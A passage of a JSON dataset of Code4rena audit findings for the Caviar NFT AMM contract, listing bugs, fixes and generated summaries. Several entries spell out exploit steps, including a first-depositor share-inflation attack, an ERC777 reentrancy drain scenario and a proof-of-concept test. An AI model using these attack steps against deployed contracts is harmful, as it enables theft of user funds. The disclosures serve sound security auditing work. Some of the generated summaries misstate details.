owner of the NFT token is possible by this attack and if that action can harm the NFT token holders then attacker can harm by doing this attack and performing that action.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nThe real solution to prevent this attack (stealing air drops) can be hard. some of the things can be done is:\n* create functionality so admin can call `getAirDrop()` functions during the airdrops before attacker.\n* call `getAirDrop()` (which admin specified) function before unwrapping tokens.\n* make some fee for NFT token unwrapping.\n* create some lock time(some days) for each wrapped NFT that in that lock time only the one who supplied that token can unwrap it.\n* create some delay for unwrapping tokens and if user wants to unwrap token he would receive it after this delay.\n\n**[outdoteth (Caviar) acknowledged, but disagreed with severity](https://github.com/code-423n4/2022-12-caviar-findings/issues/367#event-8160517199)**\n\n**[berndartmueller (judge) decreased severity to Medium](https://github.com/code-423n4/2022-12-caviar-findings/issues/367#event-8227237597)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Pair contract code, which allows users to wrap and unwrap NFT tokens without paying any fees. This can be exploited in a variety of ways, including stealing NFT tokens airdrops, stealing staked amounts, and performing other actions that can harm NFT token holders. The vulnerability was discovered by using VIM.\n\nThe impact of this vulnerability is that users can wrap their NFT tokens (which id is whitelisted) and receive fractional tokens, or pay fractional tokens and unwrap NFT tokens. This allows the attacker to swap their NFT token id with another NFT token id without paying any fee, as long as both ids are whitelisted. Furthermore, the attacker can swap their NFT token (with whitelisted id) for all the NFT balance of the contract and steal those NFT tokens airdrop all in one transaction.\n\nTo mitigate this vulnerability, the real solution is hard. Some of the things that can be done are: creating functionality so admin can call `getAirDrop()` functions during the airdrops before the attacker, calling `getAirDrop()` (which admin specified) function before unwrapping tokens, making some fee for NFT token unwrapping, creating some lock time for each wrapped NFT, and creating some delay for unwrapping tokens.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "https://github.com/code-423n4/2022-12-caviar-findings/issues/367",
      "tags": [
        "NFT",
        "Airdrop",
        "Ownership"
      ],
      "finders": [
        "unforgiven",
        "imare  ElKu"
      ]
    },
    {
      "id": "6101",
      "title": "[M-03] Rounding error in `buyQuote` might result in free tokens",
      "impact": "MEDIUM",
      "content": "\nIn order to guarantee the contract does not become insolvent, incoming assets should be rounded up, while outgoing assets should be rounded down.\n\nThe function `buyQuote()` calculates the amount of base tokens required to buy a given amount of fractional tokens. However, this function rounds down the required amount, which is in favor of the buyer (i.e. he/she has to provide less base tokens for the amount of receiving fractional tokens.\n\nDepending on the amount of current token reserves and the amount of fractional tokens the user wishes to buy, it might be possible to receive free fractional tokens.\n\nAssume the following reserve state:\n\n*   base token reserve: 0,1 WBTC (=`1e7`)\n*   fractional token reserve: 10.000.000 (=`1e25`)\n\nThe user wishes to buy 0,9 fractional tokens (=`9e17`). Then, the function `buyQuote()` will calculate the amount of base tokens as follows:\n\n`(9e17 * 1000 * 1e7) / ((1e25 - 9e17) * 997) = 0,903`\n\nAs division in Solidity will round down, the amount results in `0` amount of base tokens required (WBTC) to buy 0,9 fractional tokens.\n\n### Impact\n\nUsing the example above, 0,9 fractional tokens is a really small amount (`0,1 BTC / 1e7 = +- $0,00017`). Moreover, if the user keeps repeating this attack, the fractional token reserve becomes smaller, which will result in a buyQuote amount of >1, after which the tokens will not be free anymore.\n\nAdditionally, as the contract incorporates a fee of 30bps, it will likely not be insolvent. The downside would be the LP holder, which will receive a fee of less than 30bps. Hence, the impact is rated as medium.\n\n### Recommended Mitigation Steps\n\nFor incoming assets, its recommended to round up the required amount. We could use solmates `FixedPointMathLib` library to calculate the quote and round up. This way the required amount will always at least be 1 wei:\n\n```solidity\nfunction buyQuote(uint256 outputAmount) public view returns (uint256) {\n  return mulDivUp(outputAmount * 1000, baseTokenReserves(), (fractionalTokenReserves() - outputAmount) * 997);\n}\n```\n\n**[outdoteth (Caviar) confirmed and commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/243#issuecomment-1373918925):**\n > Fixed in: https://github.com/outdoteth/caviar/pull/4\n> \n> Uses muldivup from solmate to round up the calculation in buyQuote.\n\n\n\n***\n\n",
      "summary": "\nThis bug report details a vulnerability in the code of the contract Pair.sol, which is hosted on GitHub. The function `buyQuote()` calculates the amount of base tokens required to buy a given amount of fractional tokens, but it rounds down the required amount, which is in favor of the buyer. Depending on the amount of current token reserves and the amount of fractional tokens the user wishes to buy, it might be possible to receive free fractional tokens.\n\nThe impact of this vulnerability is rated as medium, as the fractional token reserve can become smaller, and the LP holder will receive a fee of less than 30bps. \n\nThe recommended mitigation step is to round up the required amount of incoming assets, and use the `FixedPointMathLib` library to calculate the quote and round up. This way, the required amount will always be at least 1 wei.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "https://github.com/code-423n4/2022-12-caviar-findings/issues/243",
      "tags": [
        "Rounding"
      ],
      "finders": [
        "yixxas",
        "koxuan",
        "bytehat",
        "minhtrng",
        "Zarf",
        "adriro",
        "Franfran",
        "hihen",
        "wait",
        "hansfriese",
        "chaduke",
        "UNCHAIN",
        "Apocalypto",
        "Jeiwan",
        "0xDave",
        "kiki_dev",
        "CRYP70",
        "unforgiven",
        "rajatbeladiya"
      ]
    },
    {
      "id": "6100",
      "title": "[M-02] Price will not always be 18 decimals, as expected and outlined in the comments",
      "impact": "MEDIUM",
      "content": "\nThe `price()` function is expected to return the price of one fractional tokens, represented in base tokens, to 18 decimals of precision. This is laid out clearly in the comments:\n\n`/// @notice The current price of one fractional token in base tokens with 18 decimals of precision.`<br>\n`/// @dev Calculated by dividing the base token reserves by the fractional token reserves.`<br>\n`/// @return price The price of one fractional token in base tokens * 1e18.`<br>\n\n\nHowever, the formula incorrectly calculates the price to be represented in whatever number of decimals the base token is in. Since there are many common base tokens (such as USDC) that will have fewer than 18 decimals, this will create a large mismatch between expected prices and the prices that result from the function.\n\n### Proof of Concept\n\nPrices are calculated with the following formula, where `ONE = 1e18`:\n\n```solidity\nreturn (_baseTokenReserves() * ONE) / fractionalTokenReserves();\n```\n\nWe know that `fractionalTokenReserves` will always be represented in 18 decimals. This means that the `ONE` and the\n`fractionalTokenReserves` will cancel each other out, and we are left with the `baseTokenReserves` number of decimals for the final price.\n\nAs an example:\n\n*   We have `$1000` USDC in reserves, which at 6 decimals is 1e9\n*   We have 1000 fractional tokens in reserve, which at 18 decimals is 1e21\n*   The price calculation is `1e9 * 1e18 / 1e21 = 1e6`\n*   While the value should be 1 token, the 1e6 will be interpreted as just 1/1e12 tokens if we expect the price to be in 1e18\n\n### Recommended Mitigation Steps\n\nThe formula should use the decimals value of the `baseToken` to ensure that the decimals of the resulting price ends up with 18 decimals as expected:\n\n```solidity\nreturn (_baseTokenReserves() * 10 ** (36 - ERC20(baseToken).decimals()) / fractionalTokenReserves();\n```\n\nThis will multiple `baseTokenReserves` by 1e18, and then additionally by the gap between 1e18 and its own decimals count, which will result in the correct decimals value for the outputted price.\n\n**[outdoteth (Caviar) confirmed and commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/141#issuecomment-1373910029):**\n > Fixed in: https://github.com/outdoteth/caviar/pull/5\n> \n> Always ensure that the exponent is 18 greater than the denominator. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an incorrect calculation of the price in the `price()` function of the Pair.sol source code. The function is expected to return the price of one fractional token in base tokens with 18 decimals of precision, but instead it returns a price with the number of decimals of the base token, which is usually fewer than 18. This creates a mismatch between expected prices and the prices that result from the function.\n\nThe incorrect formula used in the code is `return (_baseTokenReserves() * ONE) / fractionalTokenReserves();`, where `ONE = 1e18`. Since `fractionalTokenReserves` is always represented in 18 decimals, the `ONE` and the `fractionalTokenReserves` cancel each other out, and the final price is represented in the number of decimals of the `baseTokenReserves`. As an example, if the `baseTokenReserves` is $1000 USDC (1e9) and the `fractionalTokenReserves` is 1000 tokens (1e21), the price calculation is `1e9 * 1e18 / 1e21 = 1e6`, while the value should be 1 token. \n\nThe recommended mitigation step is to use the decimals value of the `baseToken` in the formula to ensure that the decimals of the resulting price ends up with 18 decimals as expected: `return (_baseTokenReserves() * 10 ** (36 - ERC20(baseToken).decimals()) / fractionalTokenReserves();`. This will multiple `baseTokenReserves` by 1e18, and then additionally by the gap between 1e18 and its own decimals count, which will result in the correct decimals value for the outputted price.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "https://github.com/code-423n4/2022-12-caviar-findings/issues/141",
      "tags": [
        "Decimals"
      ],
      "finders": [
        "8olidity",
        "yixxas",
        "cozzetti",
        "cryptostellar5",
        "ladboy233",
        "koxuan",
        "0xmuxyz",
        "Tricko",
        "ktg",
        "CRYP70",
        "obront"
      ]
    },
    {
      "id": "6099",
      "title": "[M-01] Missing deadline checks allow pending transactions to be maliciously executed",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L63> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L107> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L147> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L182> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L275> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L294> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L310> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L323>\n\nThe `Pair` contract does not allow users to submit a deadline for their action. This missing feature enables pending transactions to be maliciously executed at a later point.\n\n### Detailed description\n\nAMMs should provide their users with an option to limit the execution of their pending actions, such as swaps or adding and removing liquidity. The most common solution is to include a deadline timestamp as a parameter (for example see [Uniswap V2](https://github.com/Uniswap/v2-periphery/blob/0335e8f7e1bd1e8d8329fd300aea2ef2f36dd19f/contracts/UniswapV2Router02.sol#L229)). If such an option is not present, users can unknowingly perform bad trades:\n\n1.  Alice wants to swap 100 fractional NFT tokens (`fTokens`) for 1 ETH and later sell the 1 ETH for 1000 DAI. She signs the transaction calling `Pair.sell` with `inputAmount = 100 fTokens` and `minOutputAmount = 0.99 ETH` to allow for some slippage.\n2.  The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.\n3.  When the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it, her swap will be executed. In the meantime, the price of `ETH` could have drastically changed. She will still at least get `0.99 ETH` due to `minOutputAmount`, but the `DAI` value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.\n\nAn even worse way this issue can be maliciously exploited is through MEV:\n\n1.  The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. The price of `fToken` has gone up significantly since the transaction was signed, meaning Alice would receive a lot more `ETH` when the swap is executed. But that also means that her `minOutputAmount` value is outdated and would allow for significant slippage.\n2.  A MEV bot detects the pending transaction. Since the outdated `minOutputAmount` now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.\n\nThe affected functions in `Pair.sol` are:\n\n*   `add()`\n*   `remove()`\n*   `buy()`\n*   `sell()`\n*   `nftAdd()`\n*   `nftRemove()`\n*   `nftBuy()`\n*   `nftSell()`\n\n### Recommended Mitigation Steps\n\nIntroduce a `deadline` parameter to the mentioned functions.\n\n### A word on the severity\n\nCategorizing this issue into medium versus high was not immediately obvious. I came to the conclusion that this is a high-severity issue for the following reason:\n\nI run an arbitrage MEV bot myself, which also tracks pending transactions in the mempool, though for another reason than the one mentioned in this report. There is a *significant* amount of pending and even dropped transactions: over `200,000` transactions that are older than one month. These transactions do all kinds of things, from withdrawing from staking contracts to sending funds to CEXs and also performing swaps on DEXs like Uniswap. This goes to show that this issue will in fact be very real, there will be very old pending transactions wanting to perform trades without a doubt. And with the prevalence of advanced MEV bots, these transactions will be exploited as described in the second example above, leading to losses for Caviar's users.\n\n### Proof of Concept\n\nOmitted in this case, since the exploit is solely based on the fact that there is no limit on how long a transaction is allowed to be pending, which can be clearly seen when looking at the mentioned functions.\n\n**[berndartmueller (judge) decreased severity to Medium](https://github.com/code-423n4/2022-12-caviar-findings/issues/28#issuecomment-1377558048)**\n\n**[outdoteth (Caviar) commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/28#issuecomment-1398324860):**\n > Fixed in https://github.com/outdoteth/caviar/pull/6\n> \n> Add a deadline check.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Pair` contract, which is part of the Caviar project. This contract does not allow users to set a deadline for their action, which can lead to maliciously executed pending transactions. This can lead to users unknowingly performing bad trades, as the price of the asset they are trading may have changed significantly since they signed the transaction. It can also be maliciously exploited through MEV (miner extractable value), where a MEV bot can sandwich Alice, resulting in significant profit for the bot and significant loss for Alice.\n\nThe affected functions in `Pair.sol` are:\n- `add()`\n- `remove()`\n- `buy()`\n- `sell()`\n- `nftAdd()`\n- `nftRemove()`\n- `nftBuy()`\n- `nftSell()`\n\nThe recommended mitigation for this issue is to introduce a `deadline` parameter to the mentioned functions. This issue is classified as high severity, as there is a significant amount of pending and even dropped transactions, and with the prevalence of advanced MEV bots, these transactions will be exploited, leading to losses for Caviar's users.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "https://github.com/code-423n4/2022-12-caviar-findings/issues/28",
      "tags": [
        "Deadline"
      ],
      "finders": [
        "Bobface",
        "cozzetti"
      ]
    },
    {
      "id": "6098",
      "title": "[H-03] First depositor can break minting of shares",
      "impact": "HIGH",
      "content": "\nThe attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719\\_ToB_yearn_vaultsv2/ToB\\_-\\_Yearn_Vault_v\\_2\\_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large donation.\n\n### Proof of Concept\n\nIn `Pair.add()`, the amount of LP token minted is calculated as\n\n```solidity\nfunction addQuote(uint256 baseTokenAmount, uint256 fractionalTokenAmount) public view returns (uint256) {\n    uint256 lpTokenSupply = lpToken.totalSupply();\n    if (lpTokenSupply > 0) {\n        // calculate amount of lp tokens as a fraction of existing reserves\n        uint256 baseTokenShare = (baseTokenAmount * lpTokenSupply) / baseTokenReserves();\n        uint256 fractionalTokenShare = (fractionalTokenAmount * lpTokenSupply) / fractionalTokenReserves();\n        return Math.min(baseTokenShare, fractionalTokenShare);\n    } else {\n        // if there is no liquidity then init\n        return Math.sqrt(baseTokenAmount * fractionalTokenAmount);\n    }\n}\n```\n\nAn attacker can exploit using these steps\n\n1.  Create and add `1 wei baseToken - 1 wei quoteToken` to the pair. At this moment, attacker is minted `1 wei LP token` because `sqrt(1 * 1) = 1`\n2.  Transfer large amount of `baseToken` and `quoteToken` directly to the pair, such as `1e9 baseToken - 1e9 quoteToken`. Since no new LP token is minted, `1 wei LP token` worths `1e9 baseToken - 1e9 quoteToken`.\n3.  Normal users add liquidity to pool will receive `0` LP token if they add less than `1e9` token because of rounding division.\n\n```solidity\nbaseTokenShare = (X * 1) / 1e9;\nfractionalTokenShare = (Y * 1) / 1e9;\n```\n\n### Recommended Mitigation Steps\n\n*   [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `lpTokenSupply == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.\n*   In `add()`, ensure the number of LP tokens to be minted is non-zero:\n\n```solidity\nrequire(lpTokenAmount != 0, \"No LP minted\");\n```\n\n**[outdoteth (Caviar) confirmed and commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/442#issuecomment-1373902458):**\n > Fixed in: https://github.com/outdoteth/caviar/pull/3\n\n\n\n***\n \n",
      "summary": "\nThis bug report describes a vulnerability in the code of the Pair.sol contract that allows an attacker to manipulate the total asset amount and cause users to not receive shares in exchange for their deposits. The vulnerability is caused by the lack of a condition in the addQuote() function that requires the number of LP tokens to be minted to be non-zero. \n\nThe attack vector and impact is the same as TOB-YEARN-003, which is described in the audit report from July 19, 2021. In the addQuote() function, the amount of LP token minted is calculated as a fraction of existing reserves. An attacker can exploit this vulnerability by creating and adding a small amount of tokens to the pair, then transferring a large amount of tokens directly to the pair. This will cause the LP token to be worth a large amount, and users who add liquidity to the pool will receive 0 LP tokens because of rounding division.\n\nThe recommended mitigation steps are to send the first min liquidity LP tokens to the zero address when lpTokenSupply is 0, and to ensure the number of LP tokens to be minted is non-zero in the add() function.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "https://github.com/code-423n4/2022-12-caviar-findings/issues/442",
      "tags": [
        "First Depositor Issue"
      ],
      "finders": [
        "0x52",
        "yixxas",
        "ladboy233",
        "koxuan",
        "HE1M",
        "Tointer",
        "bytehat",
        "supernova",
        "carrotsmuggler",
        "minhquanym",
        "eyexploit",
        "KingNFT",
        "aviggiano",
        "Franfran",
        "fs0c",
        "hihen",
        "immeas",
        "cccz",
        "0xDecorativePineapple",
        "haku",
        "Koolex",
        "Tricko",
        "hansfriese",
        "chaduke",
        "ak1",
        "__141345__",
        "UNCHAIN",
        "lumoswiz",
        "rvierdiiev",
        "Apocalypto",
        "cozzetti",
        "SamGMK",
        "Jeiwan",
        "izhelyazkov",
        "rjs",
        "ElKu",
        "BAHOZ",
        "dipp",
        "unforgiven",
        "rajatbeladiya",
        "seyni"
      ]
    },
    {
      "id": "6097",
      "title": "[H-02] Liquidity providers may lose funds when adding liquidity",
      "impact": "HIGH",
      "content": "\nLiquidity providers may lose a portion of provided liquidity in either of the pair tokens. While the `minLpTokenAmount` protects from slippage when adding liquidity, it doesn't protect from providing liquidity at different K.\n\n### Proof of Concept\n\nThe `Pair` contract is designed to receive liquidity from liquidity providers ([Pair.sol#L63](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L63)). First liquidity provider in a pool may provide arbitrary token amounts and set the initial price ([Pair.sol#L425-L426](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L425-L426)), but all other liquidity providers must provide liquidity proportionally to current pool reserves ([Pair.sol#L420-L423](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L420-L423)). Since a pool is made of two tokens and liquidity is provided in both tokens, there's a possibility for a discrepancy: token amounts may be provided in different proportions. When this happens, the smaller of the proportions is chosen to calculate the amount of LP tokens minted ([Pair.sol#L420-L423](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L420-L423)):\n\n```solidity\n// calculate amount of lp tokens as a fraction of existing reserves\nuint256 baseTokenShare = (baseTokenAmount * lpTokenSupply) / baseTokenReserves();\nuint256 fractionalTokenShare = (fractionalTokenAmount * lpTokenSupply) / fractionalTokenReserves();\nreturn Math.min(baseTokenShare, fractionalTokenShare);\n```\n\nAs a result, the difference in proportions will create an excess of tokens that won't be redeemable for the amount of LP tokens minted. The excess of tokens gets, basically, donated to the pool: it'll be shared among all liquidity providers of the pool. While the `minLpTokenAmount` argument of the `add` function ([Pair.sol#L63](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L63)) allows liquidity providers to set the minimal amount of LP tokens they want to receive, it doesn't allow them to minimize the disproportion of token amounts or avoid it at all.\n\n```solidity\n// test/Pair/unit.Add.t.sol\n\nfunction testLockOfFunds_AUDIT() public {\n    address alice = address(0x31337);\n    address bob = address(0x12345);\n    vm.label(alice, \"alice\");\n    vm.label(bob, \"bob\");\n\n    deal(address(usd), alice, 100e18, true);\n    deal(address(usd), bob, 100e18, true);\n    deal(address(p), alice, 100e18, true);\n    deal(address(p), bob, 100e18, true);\n\n    // Alice is the first liquidity provider.\n    vm.startPrank(alice);\n    usd.approve(address(p), type(uint256).max);\n    p.add(10 ether, 10 ether, 0);\n    vm.stopPrank();\n\n    // Bob provides liquidity to the pool and sets the minimal LP amount.\n    // The token amounts are deposited in different proportions, thus the smaller\n    // one will be chosen to calculate the amount of LP tokens Bob will receive.\n    vm.startPrank(bob);\n    usd.approve(address(p), type(uint256).max);\n    uint256 minLPAmount = 1e18;\n    uint256 bobLPAmount = p.add(1.2 ether, 1 ether, minLPAmount);\n    vm.stopPrank();\n\n    // Bob has received the minimal LP amount he wanted.\n    assertEq(bobLPAmount, minLPAmount);\n\n    // However, after removing all his liquidity from the pool...\n    (uint256 bobUSDBefore, uint256 bobFracBefore) = (usd.balanceOf(bob), p.balanceOf(bob));\n    vm.prank(bob);\n    p.remove(minLPAmount, 0, 0);\n    (uint256 bobUSDAfter, uint256 bobFracAfter) = (usd.balanceOf(bob), p.balanceOf(bob));\n\n    // ... Bob received less USD than he deposited.\n    assertEq(bobUSDAfter - bobUSDBefore, 1.018181818181818181 ether);\n    assertEq(bobFracAfter - bobFracBefore, 1.000000000000000000 ether);\n}\n```\n\n### Recommended Mitigation Steps\n\nIn the `add` function, consider calculating optimal token amounts based on the amounts specified by user, current pool reserves, and the minimal LP tokens amount specified by user. As a reference, consider this piece from the Uniswap V2 Router: [UniswapV2Router02.sol#L45-L60](https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol#L45-L60).\n\n**[outdoteth (Caviar) confirmed and commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/376#issuecomment-1373894006):**\n > Fixed in: https://github.com/outdoteth/caviar/pull/2\n> \n> By allowing a user to specify a `minPrice` and `maxPrice` that they are willing to LP at along with the `minLpTokenAmount` that they would like to receive. The price calculation is based on this: https://github.com/outdoteth/caviar/blob/main/src/Pair.sol#L471\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Pair contract, which is designed to receive liquidity from liquidity providers. This vulnerability allows liquidity providers to provide liquidity at different K, which can cause them to lose a portion of the provided liquidity in either of the pair tokens. \n\nThe vulnerability is caused by the fact that the contract calculates the amount of LP tokens minted based on the smaller of the two proportions of the tokens provided. As a result, the difference in proportions creates an excess of tokens that won't be redeemable for the amount of LP tokens minted. This excess of tokens gets shared among all liquidity providers of the pool.\n\nThe bug was found through manual review. The recommended mitigation step is to consider calculating optimal token amounts based on the amounts specified by user, current pool reserves, and the minimal LP tokens amount specified by user.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "https://github.com/code-423n4/2022-12-caviar-findings/issues/376",
      "tags": [
        "Lending Pool"
      ],
      "finders": [
        "koxuan",
        "HE1M",
        "bytehat",
        "minhtrng",
        "minhquanym",
        "Chom",
        "caventa",
        "hihen",
        "cccz",
        "nicobevi",
        "RaymondFam",
        "wait",
        "hansfriese",
        "chaduke",
        "9svR6w",
        "Junnon",
        "Bobface",
        "shung",
        "0xxm",
        "__141345__",
        "carlitox477",
        "UNCHAIN",
        "Jeiwan",
        "BAHOZ",
        "mauricio1802",
        "CRYP70",
        "unforgiven",
        "obront"
      ]
    },
    {
      "id": "6096",
      "title": "[H-01] Reentrancy in buy function for ERC777 tokens allows buying funds with considerable discount",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L95><br>\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L137><br>\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L172><br>\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L203>\n\nCurrent implementation of functions `add`, `remove`, `buy` and `sell` first transfer fractional tokens, and then base tokens.\n\nIf this base token is ERC777 (extension of ERC20), we can call this function without updating the base token balance, but updating the fractional token balance.\n\n### Impact\n\nAllows to drain funds of a pairs which implements an ERC-777 token.\n\n### Proof of Concept\n\n```diff\nfunction buy(uint256 outputAmount, uint256 maxInputAmount) public payable returns (uint256 inputAmount) {\n    // *** Checks *** //\n\n    // check that correct eth input was sent - if the baseToken equals address(0) then native ETH is used\n    require(baseToken == address(0) ? msg.value == maxInputAmount : msg.value == 0, \"Invalid ether input\");\n\n    // calculate required input amount using xyk invariant\n+   @audit Use current balances\n    inputAmount = buyQuote(outputAmount);\n\n    // check that the required amount of base tokens is less than the max amount\n    require(inputAmount <= maxInputAmount, \"Slippage: amount in\");\n\n    // *** Effects *** //\n+   @audit Modifies just fractional balance\n    // transfer fractional tokens to sender\n    _transferFrom(address(this), msg.sender, outputAmount);\n\n    // *** Interactions *** //\n\n    if (baseToken == address(0)) {\n        // refund surplus eth\n        uint256 refundAmount = maxInputAmount - inputAmount;\n        if (refundAmount > 0) msg.sender.safeTransferETH(refundAmount);\n    } else {\n\n        // transfer base tokens in\n+       @audit If an ERC-777 token is used, we can re call buy function with the same balance of base token, but with different fractional balance\n        ERC20(baseToken).safeTransferFrom(msg.sender, address(this), inputAmount);\n\n    }\n    emit Buy(inputAmount, outputAmount);\n}\n```\n\n```solidity\nfunction buyQuote(uint256 outputAmount) public view returns (uint256) {\n    return (outputAmount * 1000 * baseTokenReserves()) / ((fractionalTokenReserves() - outputAmount) * 997);\n}\n```\n\nThe buy quote is used to calculate the amount of fractional token that the user will receive, and it should be less/equal to **maxInputAmount** sent by parameter in order to achieve a successful execution of function buy.\n\nCurrent buy quote can be mathematically expressed as: $\\frac{outputAmount \\times 1000 \\times baseTokenReserves}{fractionalTokenReserves - outPutAmount} \\times 997$.\n\nThen, about sales\n\n```diff\nfunction sell(uint256 inputAmount, uint256 minOutputAmount) public returns (uint256 outputAmount) {\n    // *** Checks *** //\n\n    // calculate output amount using xyk invariant\n    outputAmount = sellQuote(inputAmount);\n\n    // check that the outputted amount of fractional tokens is greater than the min amount\n    require(outputAmount >= minOutputAmount, \"Slippage: amount out\");\n\n    // *** Effects *** //\n\n    // transfer fractional tokens from sender\n+   //@audit fractional balance is updated\n    _transferFrom(msg.sender, address(this), inputAmount);\n\n    // *** Interactions *** //\n\n    if (baseToken == address(0)) {\n        // transfer ether out\n        msg.sender.safeTransferETH(outputAmount);\n    } else {\n        // transfer base tokens out\n+       @audit If an ERC-777 token is used, we can re call sell function with the same balance of base token, but with different fractional balance.\n        ERC20(baseToken).safeTransfer(msg.sender, outputAmount);\n    }\n\n    emit Sell(inputAmount, outputAmount);\n}\n```\n\n```function sellQuote(uint256 inputAmount) public view returns (uint256) {\n    uint256 inputAmountWithFee = inputAmount * 997;\n    return (inputAmountWithFee * baseTokenReserves()) / ((fractionalTokenReserves() * 1000) + inputAmountWithFee);\n}\n```\n\nCurrent sellQuote function can be expressed mathematically as:\n\n$inputAmount = \\frac{inputAmount \\times 997 \\times baseTokenReserves}{fractionalTokenReserves \\times 1000 + inputAmountWithFee}$\n\nThen we can think next scenario to drain a pair which use an ERC-777 token as base token:\n\n1.  Let's suppose the pair has 1000 base tokens(BT777) and 1000 Fractional reserve tokens (FRT)\n2.  The attacker call buy function, all with next inputs:\n    *   outputAmount = 50\n    *   maxInputAmount = 80\n3.  The attacker implements a hook, that will be executed 6 times (using a counter inside a malicus contract) when a transfer is done, and call the buy function. After this 6 times the malicious contract is call again, but this times calls the sell function, doing a huge sell for the fractional reserve token obtained.\n\nA simulation of this attack can be visualized in next table\n\n| Operation      | outputAmount (FRT) | maxInputAmount (BT777) | BT777 reserve | FRT reserve | inputAmount (BT777 to pay) | inputAmount < maxInputAmount |\n| :------------- | ------------------ | ---------------------- | ------------- | ----------- | -------------------------- | ---------------------------: |\n| Attaker buy 1  | 50                 | 80                     | 1000          | 1000        | 52                         |                         TRUE |\n| Callback buy 2 | 50                 | 80                     | 1000          | 950         | 55                         |                         TRUE |\n| Callback buy 3 | 50                 | 80                     | 1000          | 900         | 59                         |                         TRUE |\n| Callback buy 4 | 50                 | 80                     | 1000          | 850         | 62                         |                         TRUE |\n| Callback buy 5 | 50                 | 80                     | 1000          | 800         | 66                         |                         TRUE |\n| Callback buy 6 | 50                 | 80                     | 1000          | 750         | 71                         |                         TRUE |\n| Callback buy 7 | 50                 | 80                     | 1000          | 700         | 77                         |                         TRUE |\n\nThe result of this operation is that the attaker/malicious contract has 350 FRT, while BT777 reserve still has 1000 and FRT reserve has 650 tokens. The success execution needs that the attacker pays 442 BT777 eventually.\n\nTo do this, the last operation of the malicious contract is calling sell function\n\n| Operation    | inputAmount(BT777) | minOutputAmount | BT777 reserve | FRT reserve | outputAmount 